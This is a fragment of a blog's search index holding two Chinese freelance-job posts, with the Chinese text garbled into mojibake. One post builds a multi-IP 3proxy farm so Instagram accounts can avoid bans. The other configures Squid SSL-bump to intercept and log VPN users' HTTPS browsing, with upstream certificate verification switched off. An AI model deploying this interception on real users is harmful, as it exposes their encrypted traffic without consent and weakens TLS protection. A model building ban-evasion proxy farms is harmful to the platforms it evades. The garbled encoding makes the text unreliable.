10ä¸ªIP\nç¬¬ä¸‰æ­¥å°±æ˜¯å®‰è£…Proxyè½¯ä»¶äº†ï¼š\nä¸‹è½½3Proxy\nwget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz tar zxvf 0.8.11.tar.gz ç¼–è¯‘å®‰è£…ï¼š\ncd 3proxy-0.8.11 sed -i \u0026#39;s/^prefix.*/prefix=\\/usr\\/local\\/3proxy/\u0026#39; Makefile.Linux sed -i \u0026#39;/DENY.*/a #define ANONYMOUS 1\u0026#39; src/proxy.h make -f Makefile.Linux make -f Makefile.Linux install æ³¨æ„ä¸Šé¢æˆ‘æ˜¯å®‰è£…åˆ°äº†/usr/local/3proxyï¼Œå¤§å®¶å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ã€‚\nçœ‹çœ‹é…ç½®éƒ½æ˜¯ä»€ä¹ˆ\ncat cfg/3proxy.cfg.sample |grep -v ^# | grep -v ^$ nserver 10.1.2.1 nserver 10.2.2.2 nscache 65536 timeouts 1 5 30 60 180 1800 15 60 users 3APA3A:CL:3apa3a \u0026#34;test:CR:$1$qwer$CHFTUFGqkjue9HyhcMHEe1\u0026#34; service log c:\\3proxy\\logs\\3proxy.log D logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; archiver rar rar a -df -inul %A %F rotate 30 auth iponly external 10.1.1.1 internal 192.168.1.1 auth none dnspr auth strong deny * * 127.0.0.1,192.168.1.1 allow * * * 80-88,8080-8088 HTTP allow * * * 443,8443 HTTPS proxy -n auth none pop3p tcppm 25 mail.my.provider 25 auth strong flush allow 3APA3A,test maxconn 20 socks auth strong flush internal 127.0.0.1 allow 3APA3A 127.0.0.1 maxconn 3 admin ä¸€å †çš„åºŸç‰©é…ç½®å•Šï¼Œç»Ÿç»Ÿå»æ‰\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/usr/local/3proxy/bin/3proxy.conf daemon timeouts 1 5 30 60 180 1800 15 60 log /var/log/3proxy.log D logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; rotate 30 users user:CL:pass auth strong allow user proxy -p3128 -a -i172.16.8.1 -e172.16.8.1 flush EOF æœ‰ç”¨çš„å°±æ˜¯ä¸‹é¢5è¡Œ users å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·user,æ˜æ–‡å¯†ç ï¼Œå¯†ç æ˜¯pass auth å®šä¹‰äº†éœ€è¦è®¤è¯ allow å®šä¹‰äº†userç”¨æˆ·å¯ä»¥è®¿é—® proxy -pç«¯å£ -a -iå†…ç½‘ç›‘å¬ip -eå‡ºå£ip\nokäº†ï¼Œç„¶åå¯åŠ¨ï¼š\ncd /usr/local/3proxy/bin ./3proxy 3proxy.conf æµ‹è¯•ä¸€ä¸‹ï¼š\ncurl --proxy 172.16.8.1:3128 --proxy-user user:pass http://www.sina.com.cn -vvv|more è¿˜æœ‰ä¸ªéœ€æ±‚ï¼Œipv6\næ ¼å¼å¦‚ä¸‹ proxy -6 -n -a -p\u0026lt;PORT1\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; proxy -6 -n -a -p\u0026lt;PORT2\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; ... è¿™ä¹ˆæä¸€ä¸‹å³å¯ï¼š proxy -6 -n -a -p3128 -i172.16.8.1 -e2a02:26f0:4000:17d::2adb okï¼Œæå®šã€‚\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_3/","summary":"\u003cp\u003eä»»åŠ¡çš„è¦æ±‚æ˜¯ï¼š\u003c/p\u003e\n\u003cp\u003eâ€¢ Multiple subnets to avoid bans\nâ€¢I need the proxies to have the ability of User:Pass\nâ€¢Proxy needs to be Residential IPv6\u003c/p\u003e\n\u003cp\u003eè¿˜ç»™å‡ºäº†ä¸€ä¸ªå‚è€ƒï¼š\n\u003ca href=\"https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\"\u003ehttps://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eæ©ï¼Œæ¯”è¾ƒæœ‰æ„æ€ã€‚æŒ‰ç…§ä»–ç»™çš„è¿æ¥ï¼š\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€æ­¥å» LowEndBox.com æˆ–è€… Webhostingtalk.com å»æ‰¾ä¸€å®¶å£ç¢‘æ¯”è¾ƒå¥½ï¼Œè€Œä¸”èƒ½æä¾›é™„åŠ ipçš„VPSä¾›åº”å•†ï¼Œé€šå¸¸é™„åŠ ä¸€ä¸ªIPæ˜¯1$ä¸€ä¸ªæœˆã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒæ­¥ä¹°ä¸ªVPSï¼Œé…ç½®æ˜¯1Gå†…å­˜ï¼Œ1ä¸ªå†…æ ¸ï¼Œ100Må¸¦å®½ï¼Œå¹¶ä¸”é™„åŠ 10ä¸ªIPã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·çš„VPSä¸€èˆ¬æ˜¯5$ä¸€ä¸ªæœˆï¼Œ10$10ä¸ªipä¸€ä¸ªæœˆï¼Œåˆè®¡15$ä¸€ä¸ªæœˆï¼Œ100å…ƒäººæ°‘å¸ï¼Œè¿™æ ·ä½ å°±æœ‰11ä¸ªIPå¯ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæŒ‰è¿™ä¸ªä»»åŠ¡çš„è¦æ±‚ï¼Œéœ€è¦Multiple subnetï¼Œä½ å°±ä»è¿™å®¶ä¾›åº”å•†çš„ä¸åŒåœ°ç‚¹å¤šä¹°å‡ å°ï¼Œæ¯”å¦‚æ´›æ‰çŸ¶1å°ï¼Œå¾·å·1å°ï¼Œçº½çº¦1å°ï¼Œç„¶åæ¯å°é™„åŠ 10ä¸ªIP\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸‰æ­¥å°±æ˜¯å®‰è£…Proxyè½¯ä»¶äº†ï¼š\u003c/p\u003e\n\u003cp\u003eä¸‹è½½3Proxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf 0.8.11.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¯‘å®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e 3proxy-0.8.11  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/^prefix.*/prefix=\\/usr\\/local\\/3proxy/\u0026#39;\u003c/span\u003e Makefile.Linux  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;/DENY.*/a #define ANONYMOUS 1\u0026#39;\u003c/span\u003e src/proxy.h  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake -f Makefile.Linux  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake -f Makefile.Linux install  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢æˆ‘æ˜¯å®‰è£…åˆ°äº†/usr/local/3proxyï¼Œå¤§å®¶å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ã€‚\u003c/p\u003e\n\u003cp\u003eçœ‹çœ‹é…ç½®éƒ½æ˜¯ä»€ä¹ˆ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat cfg/3proxy.cfg.sample \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -v ^# \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v ^$  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enserver 10.1.2.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enserver 10.2.2.2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enscache \u003cspan class=\"m\"\u003e65536\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etimeouts \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"m\"\u003e30\u003c/span\u003e \u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"m\"\u003e180\u003c/span\u003e \u003cspan class=\"m\"\u003e1800\u003c/span\u003e \u003cspan class=\"m\"\u003e15\u003c/span\u003e \u003cspan class=\"m\"\u003e60\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusers 3APA3A:CL:3apa3a \u003cspan class=\"s2\"\u003e\u0026#34;test:CR:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1$qwer$CHFTUFGqkjue9HyhcMHEe1\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog c:\u003cspan class=\"se\"\u003e\\3\u003c/span\u003eproxy\u003cspan class=\"se\"\u003e\\l\u003c/span\u003eogs\u003cspan class=\"se\"\u003e\\3\u003c/span\u003eproxy.log D  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elogformat \u003cspan class=\"s2\"\u003e\u0026#34;- +_L%t.%.  %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003earchiver rar rar a -df -inul %A %F  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erotate \u003cspan class=\"m\"\u003e30\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth iponly  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexternal 10.1.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einternal 192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth none  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednspr  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edeny * * 127.0.0.1,192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow * * * 80-88,8080-8088 HTTP  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow * * * 443,8443 HTTPS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxy -n  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth none  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epop3p  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcppm \u003cspan class=\"m\"\u003e25\u003c/span\u003e mail.my.provider \u003cspan class=\"m\"\u003e25\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eflush  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow 3APA3A,test  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emaxconn \u003cspan class=\"m\"\u003e20\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocks  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eflush  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einternal 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow 3APA3A 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emaxconn \u003cspan class=\"m\"\u003e3\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸€å †çš„åºŸç‰©é…ç½®å•Šï¼Œç»Ÿç»Ÿå»æ‰\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹ä¸‰ï¼šSetup Proxy on VPS for Instagram"},{"content":"è¿™ä¸ªéœ€æ±‚ä¹Ÿæ¯”è¾ƒç®€å•ï¼š\nUser Browsing Log for Open VPN server\nç®€å•è¯´å°±æ˜¯ç”¨æˆ·è¿åˆ°ä»–çš„openvpnæœåŠ¡å™¨ï¼Œé€šè¿‡ä¸Šé¢çš„squidä»£ç†æ¥æµè§ˆå…¶ä»–ç½‘ç«™ï¼Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯éœ€è¦æŸ¥çœ‹ç”¨æˆ·httpå’Œhttpsçš„æµè§ˆè®°å½•ã€‚\nsquidåšé€æ˜ä»£ç†ï¼Œè¿™æ ·å°±å¯ä»¥æˆªå–æµè§ˆè®°å½•å¹¶ä¸”æä¾›åŠ é€Ÿäº†\næœåŠ¡å™¨æ˜¯Ubuntuï¼Œç¼ºçœå®‰è£…çš„çš„squidæ˜¯ä¸æ”¯æŒSSLçš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç¼–è¯‘ä¸€ä¸ª\nå®‰è£…ä¾èµ–åŒ…ï¼š\nsudo apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch sudo apt-get build-dep squid3 sudo apt-get build-dep openssl sudo apt-get install libssl-dev sudo apt-get source squid3 ä¸‹è½½åˆ°squidçš„æºä»£ç ï¼Œä»¥åŠubuntuçš„ä¿®æ”¹åŒ…ï¼Œè§£å‹å¹¶é‡Šæ”¾ï¼š\ntar zxvf squid3_3.5.12.orig.tar.gz cd squid3-3.5.12 tar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz ä¿®æ”¹å‚æ•°å¢åŠ å¯¹sslçš„æ”¯æŒï¼š\nvi debian/rules Add --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section. DEB_CONFIGURE_EXTRA_FLAGS := BUILDCXXFLAGS=\u0026#34;$(CXXFLAGS) $(LDFLAGS)\u0026#34; \\ ... --with-default-user=proxy \\ --with-openssl \\ --enable-ssl \\ --enable-ssl-crtd ... ç¼–è¯‘ï¼Œä¼šç”Ÿæˆ7ä¸ªdebåŒ…\ndebuild -us -uc -b cd .. ls -1 *.deb squid3_3.5.12-1ubuntu7.5_all.deb squid_3.5.12-1ubuntu7.5_amd64.deb squid-cgi_3.5.12-1ubuntu7.5_amd64.deb squidclient_3.5.12-1ubuntu7.5_amd64.deb squid-common_3.5.12-1ubuntu7.5_all.deb squid-dbg_3.5.12-1ubuntu7.5_amd64.deb squid-purge_3.5.12-1ubuntu7.5_amd64.deb å®‰è£…ï¼Œå…ˆè£…è¯­è¨€åŒ…ï¼Œç„¶åå®‰è£…ä¸‰ä¸ªè‡ªå·±ç”Ÿæˆçš„åŒ…\nsudo apt-get install squid-langpack sudo dpkg -i squid_3.5.12-1ubuntu7.5_amd64.deb squid-common_3.5.12-1ubuntu7.5_all.deb squid-dbg_3.5.12-1ubuntu7.5_amd64.deb æ£€æŸ¥ä¸€ä¸‹æ–°çš„squidæ˜¯å¦æ”¯æŒssläº†\nsquid -v|grep ssl configure options: \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/usr\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--libexecdir=${prefix}/lib/squid3\u0026#39; \u0026#39;--srcdir=.\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-cache-digests\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,NIS,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=kerberos,wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,smb_lm\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,kerberos_ldap_group,LDAP_group,session,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-icmp\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--enable-ecap\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/var/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--with-openssl\u0026#39; \u0026#39;--enable-ssl\u0026#39; \u0026#39;--enable-ssl-crtd\u0026#39; \u0026#39;--enable-build-info=Ubuntu linux\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wall\u0026#39; \u0026#39;LDFLAGS=-Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security\u0026#39; cd /usr/lib/squid ls ssl_crtd Genå‡ºsslçš„è¯ä¹¦å’Œå¯†é’¥å¹¶æ‹·è´åˆ°æ­£ç¡®çš„ä½ç½®ï¼Œæ›´æ–°ca-certificatesï¼š\nopenssl genrsa -out squid.key 2048 openssl req -new -key squid.key -out squid.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]:CN State or Province Name (full name) [Some-State]:Beijing Locality Name (eg, city) []:Beijing Organization Name (eg, company) [Internet Widgits Pty Ltd]:Rendoumi.com Organizational Unit Name (eg, section) []:Rendoumi.com Common Name (e.g. server FQDN or YOUR name) []:159.89.116.192 Email Address []: Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: openssl x509 -req -days 3650 -in squid.csr -signkey squid.key -out squid.crt Signature ok subject=/C=CN/ST=Beijing/L=Beijing/O=Rendoumi.com/OU=Rendoumi.com/CN=159.89.116.192 Getting Private key sudo cp squid.crt /usr/local/share/ca-certificates sudo /usr/sbin/update-ca-certificates Updating certificates in /etc/ssl/certs... 1 added, 0 removed; done. Running hooks in /etc/ca-certificates/update.d... done. sudo cp squid.pem /etc/squid ä¿®æ”¹/etc/squid.confé…ç½®æ–‡ä»¶\ncd /etc/squid cat squid.conf|grep -v ^# | grep -v ^$ sudo vi /etc/squid/squid.conf ---------------------------------------- acl SSL_ports port 443 acl Safe_ports port 80 # http acl Safe_ports port 21 # ftp acl Safe_ports port 443 # https acl Safe_ports port 70 # gopher acl Safe_ports port 210 # wais acl Safe_ports port 1025-65535 # unregistered ports acl Safe_ports port 280 # http-mgmt acl Safe_ports port 488 # gss-http acl Safe_ports port 591 # filemaker acl Safe_ports port 777 # multiling http acl CONNECT method CONNECT acl localnet src 10.8.0.0/16 http_access deny !Safe_ports http_access deny CONNECT !SSL_ports http_access allow localhost manager http_access deny manager http_access allow localhost http_access allow localnet http_access deny all coredump_dir /var/spool/squid refresh_pattern ^ftp: 1440 20% 10080 refresh_pattern ^gopher: 1440 0% 1440 refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0 refresh_pattern (Release|Packages(.gz)*)$ 0 20% 2880 # example lin deb packages #refresh_pattern (\\.deb|\\.udeb)$ 129600 100% 129600 refresh_pattern . 0 20% 4320 shutdown_lifetime 3 http_port 3128 intercept https_port 3129 intercept ssl-bump generate-host-certificates=on version=1 options=NO_SSLv2,NO_SSLv3,SINGLE_DH_USE dynamic_cert_mem_cache_size=4MB cert=/etc/squid/squid.pem always_direct allow all ssl_bump none localhost ssl_bump server-first all sslproxy_cert_error allow all sslproxy_flags DONT_VERIFY_PEER sslcrtd_program /usr/lib/squid/ssl_crtd -s /var/lib/ssl_db -M 4MB sslcrtd_children 8 startup=1 idle=1 ---------------------------------------- åˆå§‹åŒ–ssl_db\nsudo /usr/lib/squid/ssl_crtd -c -s /var/lib/ssl_db/ chown -R proxy /var/lib/ssl_db é‡å¯squid\nsudo systemctl restart squid.service ç‰¹åˆ«çš„ä¸€ç‚¹ï¼Œé›‡ä¸»å†™äº†å·¨å¤šçš„ufwçš„è§„åˆ™ï¼Œå¯¼è‡´IPTABLEçˆ†æ»¡ï¼Œå±…ç„¶æ— æ³•æ‰‹åŠ¨æ¸…é™¤æ‰€æœ‰çš„è§„åˆ™ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°è¿™æ ·çš„ï¼Œåªèƒ½å†™è„šæœ¬æ¸…é™¤ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nvi cl.txt ----------------------- # Empty the entire filter table *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT ----------------------- sudo iptables-restore \u0026lt; cl æœ€åä¿®æ”¹IPTABLESï¼ŒæŠŠ80å’Œ443çš„è¯·æ±‚éƒ½é€åˆ°squidå»\nsudo vi /etc/rc.local iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 80 -j REDIRECT --to-ports 3128 iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 443 -j REDIRECT --to-ports 3129 iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to 159.89.116.192 ç”¨ä»£ç†è®¿é—®ï¼ŒéªŒè¯ä¸€ä¸‹ï¼š\nsudo tail -f /var/log/squid/access.log è¿™æ ·åšæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯httpså®é™…æ˜¯è¢«åŠ«æŒä»£ç†äº†ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¼šå¼¹å‡ºä¸ªæ˜¯å¦ä¿¡ä»»è¯ä¹¦ï¼Œé™¤éåœ¨æ¯ä¸ªå®¢æˆ·ç«¯ä¸­é¢„åŸ‹ï¼Œè¿™æ ·æ‰èƒ½è§£å†³ã€‚\nThat is all.\n","permalink":"https://rendoumi.com/posts/20240124-freelancer_4/","summary":"\u003cp\u003eè¿™ä¸ªéœ€æ±‚ä¹Ÿæ¯”è¾ƒç®€å•ï¼š\u003c/p\u003e\n\u003cp\u003eUser Browsing Log for Open VPN server\u003c/p\u003e\n\u003cp\u003eç®€å•è¯´å°±æ˜¯ç”¨æˆ·è¿åˆ°ä»–çš„openvpnæœåŠ¡å™¨ï¼Œé€šè¿‡ä¸Šé¢çš„squidä»£ç†æ¥æµè§ˆå…¶ä»–ç½‘ç«™ï¼Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯éœ€è¦æŸ¥çœ‹ç”¨æˆ·httpå’Œhttpsçš„æµè§ˆè®°å½•ã€‚\u003c/p\u003e\n\u003cp\u003esquidåšé€æ˜ä»£ç†ï¼Œè¿™æ ·å°±å¯ä»¥æˆªå–æµè§ˆè®°å½•å¹¶ä¸”æä¾›åŠ é€Ÿäº†\u003c/p\u003e\n\u003cp\u003eæœåŠ¡å™¨æ˜¯Ubuntuï¼Œç¼ºçœå®‰è£…çš„çš„squidæ˜¯ä¸æ”¯æŒSSLçš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç¼–è¯‘ä¸€ä¸ª\u003c/p\u003e\n\u003cp\u003eå®‰è£…ä¾èµ–åŒ…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get build-dep squid3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get build-dep openssl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install libssl-dev  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get \u003cspan class=\"nb\"\u003esource\u003c/span\u003e squid3  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‹è½½åˆ°squidçš„æºä»£ç ï¼Œä»¥åŠubuntuçš„ä¿®æ”¹åŒ…ï¼Œè§£å‹å¹¶é‡Šæ”¾ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf squid3_3.5.12.orig.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e squid3-3.5.12  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz  